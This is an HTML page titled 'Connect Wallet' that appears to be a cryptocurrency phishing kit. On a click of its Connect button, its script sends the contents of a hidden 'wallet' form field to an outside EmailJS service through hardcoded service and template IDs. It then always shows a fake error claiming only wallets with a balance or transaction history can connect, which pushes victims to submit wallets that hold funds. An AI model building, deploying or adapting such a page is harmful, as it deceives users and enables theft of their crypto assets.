<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connect Wallet</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f8f8f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #0066ff;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 10px;
    }
    #error-box {
      display: none;
      position: relative;
      background: #ffe6e6;
      border: 1px solid #cc0000;
      color: #cc0000;
      font-size: 0.85rem;
      font-weight: 500;
      text-align: left;
      padding: 15px 40px 15px 15px;
      border-radius: 6px;
      margin-top: 15px;
      animation: fadeIn 0.5s ease-in-out;
    }
    #error-box span {
      position: absolute;
      top: 8px;
      right: 12px;
      font-size: 1.2rem;
      cursor: pointer;
      font-weight: bold;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Connect Wallet</h2>
    
    <form id="wallet-form">
      <!-- Hidden fields if needed -->
      <input type="hidden" name="wallet" value="user_wallet_info" />
    </form>

    <button id="connect-btn" onclick="submitWallet()">Connect</button>

    <div id="error-box">
      <span onclick="closeWalletPage()">Ã—</span>
      <p id="error-message-text"></p>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("JWcOE8k4MMUEFNPy-"); // Your public key
    })();

    function closeWalletPage() {
      window.location.href = "index.html";
    }

    function submitWallet() {
      const btn = document.getElementById("connect-btn");
      btn.disabled = true;
      btn.textContent = "Connecting...";

      emailjs.sendForm('service_oh2l5fc', 'template_oty8s2s', '#wallet-form')
        .then(function(response) {
          setTimeout(() => {
            document.getElementById("error-message-text").textContent = "Wallet could not connect to server. Only wallets with a balance or transaction history can be connected. Please try again with another wallet.";
            document.getElementById("error-box").style.display = "block";
            btn.disabled = false;
            btn.textContent = "Connect";
          }, 2000);
        })
        .catch(function(error) {
          document.getElementById("error-message-text").textContent = "Unexpected server issue. Please try again.";
          document.getElementById("error-box").style.display = "block";
          btn.disabled = false;
          btn.textContent = "Connect";
        });
    }
  </script>

</body>
</html>
